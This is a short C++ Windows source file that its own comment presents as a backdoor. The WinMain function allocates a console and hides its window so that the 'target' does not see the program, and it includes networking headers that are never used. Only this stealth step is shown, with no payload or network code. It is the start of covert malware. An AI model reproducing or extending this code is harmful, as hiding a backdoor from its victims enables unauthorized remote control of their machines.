#include <winsock2.h>
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>
#include <wininet.h>
#include <iostream>
#include <sys/stat.h>
#include <sys/types.h>

/**
 * @brief Windows program entry point function.
 * 
 * @param hInstance     - Instance Handle - OS uses this value to identify the
 *                        executable when it is loaded in memory.
 * @param hPrevInstance
 * @param pCmdLine      - Command line arguments.
 * @param nCmdShow      - Windows Flags.
 * @return int 
 */
int APIENTRY WinMain(HINSTANCE hInstance,
                        HINSTANCE hPrevInstance,
                        PWSTR pCmdLine,
                        int nCmdShow) {

    /* 1. Make our backdoor window not visible to the target. */
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0); /* Hiding the window with 0. */

    return EXIT_SUCCESS;
}